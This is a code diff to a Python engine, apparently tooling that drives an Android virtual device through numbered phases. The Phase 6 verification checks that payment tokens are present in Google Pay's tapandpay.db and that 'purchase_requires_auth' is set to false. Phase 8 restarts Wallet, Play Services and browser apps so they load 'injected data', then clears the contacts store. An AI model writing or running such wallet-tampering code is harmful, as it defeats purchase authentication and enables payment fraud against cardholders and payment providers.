+                "echo V2=$(sqlite3 /data/data/com.google.android.gms/databases/tapandpay.db "
+                "'SELECT COUNT(*) FROM token_metadata' 2>/dev/null || echo 0); "
+                "echo V3=$(grep -c 'purchase_requires_auth.*false' "
+                "/data/data/com.google.android.gms/shared_prefs/COIN.xml 2>/dev/null || echo 0); "
+                "echo V4=$(settings get secure nfc_on 2>/dev/null); "
+                "echo V5=$(grep -c 'wallet_setup_complete.*true' "
+                "/data/data/com.google.android.gms/shared_prefs/wallet_instrument_prefs.xml 2>/dev/null || echo 0); "
+                "echo V6=$(ls /data/data/com.android.chrome/app_chrome/Default/'Web Data' 2>/dev/null && echo OK || echo FAIL); "
+                "echo V7=$(stat -c '%U' /data/data/com.google.android.gms/databases/tapandpay.db 2>/dev/null)"
+            )
+            v_result = await self._sh(verify_cmd, timeout=15)
+            v_checks = {}
+            for line in (v_result or "").strip().split("\n"):
+                if "=" in line:
+                    k, v = line.split("=", 1)
+                    v_checks[k.strip()] = v.strip()
+
+            v_pass = 0
+            if "OK" in v_checks.get("V1", ""):
+                v_pass += 1
+            if int(v_checks.get("V2", "0") or "0") > 0:
+                v_pass += 1
+            if int(v_checks.get("V3", "0") or "0") > 0:
+                v_pass += 1
+            if v_checks.get("V4", "") == "1":
+                v_pass += 1
+            if int(v_checks.get("V5", "0") or "0") > 0:
+                v_pass += 1
+            if "OK" in v_checks.get("V6", ""):
+                v_pass += 1
+            if v_checks.get("V7", "root") != "root":
+                v_pass += 1
+
+            self._log(f"Phase 6 — Verification: {v_pass}/7 checks passed")
+
+            # Summary
+            ok_count = sum(1 for v in results.values() if v)
+            total_count = len(results)
+            elapsed = time.time() - t0
+            summary = ", ".join(f"{k}={'ok' if v else 'FAIL'}" for k, v in results.items())
+            self._set_phase(n, "done" if ok_count >= 4 else "warn",
+                           f"{ok_count}/{total_count} targets, verify={v_pass}/7, {elapsed:.0f}s")
+            self._log(f"Phase 6 — Wallet complete: {ok_count}/{total_count} targets, "
+                      f"verify={v_pass}/7 in {elapsed:.0f}s")
 
         except Exception as e:
             self._set_phase(n, "failed", str(e)[:80])
@@ -1148,10 +1579,10 @@ class VMOSGenesisEngine:
             self._log(f"Phase 7 — Provincial FAILED: {e}")
 
     async def _phase_postharden(self, cfg: PipelineConfig):
-        """Phase 8: Post-Harden — Kiwi/Chrome prefs, media scan."""
+        """Phase 8: Post-Harden — Kiwi/Chrome prefs, media scan, app restart cycle."""
         n = 8
         self._set_phase(n, "running")
-        self._log("Phase 8 — Post-Harden: Kiwi prefs, media scan...")
+        self._log("Phase 8 — Post-Harden: Kiwi prefs, media scan, app restart...")
         try:
             email = _sanitize(cfg.google_email or cfg.email or "user@gmail.com")
             name = _sanitize(cfg.name or "User")
@@ -1190,7 +1621,40 @@ class VMOSGenesisEngine:
             )
             scan_ok = await self._sh_ok(scan_cmd, "SCAN_DONE", timeout=10)
 
-            notes = f"kiwi={'ok' if kiwi_ok else 'fail'} scan={'ok' if scan_ok else 'fail'}"
+            # ── Post-injection app restart cycle ──
+            # Force-stop then restart target apps so they pick up injected data
+            restart_apps = [
+                "com.google.android.gms",
+                "com.google.android.apps.walletnfcrel",
+                "com.android.vending",
+                "com.android.chrome",
+                "com.kiwibrowser.browser",
+                "com.google.android.gsf",
+            ]
+            restart_cmd = "; ".join(
+                f"am force-stop {pkg} 2>/dev/null" for pkg in restart_apps
+            ) + "; sleep 2; "
+            # Restart critical services
+            restart_cmd += (
+                "am startservice -n com.google.android.gms/.chimera.GmsIntentOperationService 2>/dev/null; "
+                "am start -n com.android.vending/.AssetBrowserActivity 2>/dev/null; "
+                "sleep 1; "
+                "am force-stop com.android.vending 2>/dev/null; "
+                "echo RESTART_DONE"
+            )
+            restart_ok = await self._sh_ok(restart_cmd, "RESTART_DONE", timeout=25)
+
+            # ── Clear contacts provider crash prevention ──
+            contacts_fix_cmd = (
+                "pm clear com.android.providers.contacts 2>/dev/null; "
+                "sleep 1; echo CONTACTS_FIXED"
+            )
+            contacts_ok = await self._sh_ok(contacts_fix_cmd, "CONTACTS_FIXED", timeout=10)
+
+            notes = (f"kiwi={'ok' if kiwi_ok else 'fail'} "
+                     f"scan={'ok' if scan_ok else 'fail'} "
+                     f"restart={'ok' if restart_ok else 'fail'} "
+                     f"contacts_fix={'ok' if contacts_ok else 'fail'}")
             self._set_phase(n, "done", notes)
             self._log(f"Phase 8 — Post-Harden: {notes}")
 
